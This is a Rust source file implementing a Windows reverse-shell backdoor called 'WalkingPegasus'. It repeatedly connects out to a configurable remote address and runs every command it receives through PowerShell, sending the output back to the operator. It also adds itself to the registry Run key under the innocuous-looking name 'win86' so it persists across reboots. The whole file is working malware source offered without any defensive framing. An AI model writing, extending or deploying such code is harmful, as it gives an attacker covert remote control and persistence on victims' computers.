#![allow(unused_imports, unused_variables, unused_mut)]

use std::env;
use winreg::enums::{HKEY_CURRENT_USER, KEY_WRITE};
use winreg::RegKey;
use std::net::{Shutdown, TcpStream};
use std::io::{self, Read, Write};
use std::process::Command;


pub struct WalkingPegasus {
    pub addr: String
}

impl WalkingPegasus {
    //      +=======+ FUNCTIONS +=======+      //
    fn do_something(&self, command: String, s: &mut TcpStream) {
        if command == "close_conn\n"
        {
            s.write_all(b"Byyeee Bitch !!\n").expect("");
            s.shutdown(Shutdown::Both).expect("");
        }
        else if command.starts_with("cd ") 
        {
            let path = command.trim_start_matches("cd ").trim().to_owned();
    
            if let Err(_) = env::set_current_dir(&path) {
                s.write(b"Given Directory either dosen't exist or there is other problem ;-;' \n").expect("");
            } 
            else { }
        }
        else 
        {
            let output = Command::new("powershell").arg(command).output().expect("");
            // println!("{:?}", output);
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                s.write(stdout.as_bytes()).expect("");
            }
            else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                s.write(stderr.as_bytes()).expect("");
            }
        }
    }

    pub fn connect(&self) {
        loop {
            match TcpStream::connect(self.addr.clone()) { 
                Ok(mut stream) => {
                    loop 
                    {
                        stream.write(b"[*] >> ").expect("");
                        let mut data = [0 as u8; 1024];
    
                        if let Ok(size) = stream.read(&mut data)
                        {
                            let rec_data = &data[..size];
                            let msg = String::from_utf8_lossy(rec_data).to_string();
                            // HANDLE CLIENT
                            self.do_something(msg, &mut stream);
                        }
                        else { break; }
                    }
                }
                Err(ref e) if e.kind() == io::ErrorKind::ConnectionRefused => { }
                Err(_) => { }
            }
        }
    }

    pub fn addtostartup(&self) -> Result<(), std::io::Error> {
        let current_exe = env::current_exe()?;
        let (key_path, value_name) = if cfg!(target_os = "windows")
        {
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "win86")
        }
        else 
        {
            return Err(std::io::Error::new(std::io::ErrorKind::Other, ""));
        };
    
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey_with_flags(key_path, KEY_WRITE)?;
        key.set_value(value_name, &current_exe.to_string_lossy().to_string())?;

        Ok(())
    }
}
